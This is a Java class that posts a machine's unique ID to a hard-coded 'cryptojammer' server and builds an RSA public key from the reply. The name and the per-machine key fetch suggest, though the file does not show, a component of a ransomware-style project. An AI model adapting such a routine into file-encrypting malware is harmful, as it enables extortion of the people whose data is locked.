
import com.fasterxml.jackson.core.JsonParser;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import org.json.JSONObject;



/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author admin
 */

public class ServerCommunication {
    public PublicKey getPublicKeyFromServer(String uniqueId) throws Exception {
    
    HttpClient client = HttpClient.newHttpClient();
    
    String identifier = "{\"uniqueId\":\""+uniqueId+"\"}";

    HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create("https://cryptojammer.tjeerdsma.eu/encrypt/"))
            .header("Content-Type", "application/json")
            .POST(BodyPublishers.ofString(identifier))
            .build();
    
    HttpResponse<String> response = client.send(request, BodyHandlers.ofString());
    
    PublicKey publicKey = getPublicKey(parse(response.body())); 
    
    return publicKey; 
    }
    
    public String parse(String responseBody){
        String publicKey;
        JSONObject responseKey = new JSONObject(responseBody);;
        publicKey = responseKey.getString("publicKey");
        return publicKey;
    }
    
    public PublicKey getPublicKey(String publicKeyFromServer) throws NoSuchAlgorithmException, InvalidKeySpecException{
        PublicKey publicKey = null;
        
        try{
            publicKeyFromServer = publicKeyFromServer.replaceAll("\\n", "")
                    .replace("-----BEGIN PUBLIC KEY-----", "")
                    .replace("-----END PUBLIC KEY-----", "");

            KeyFactory kf = KeyFactory.getInstance("RSA");
            X509EncodedKeySpec keySpecX509 = new X509EncodedKeySpec(Base64.getDecoder().decode(publicKeyFromServer.getBytes()));
            publicKey = kf.generatePublic(keySpecX509);
        
            return publicKey;
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            } catch (InvalidKeySpecException e) {
                e.printStackTrace();
            }
        return publicKey;

    }
}
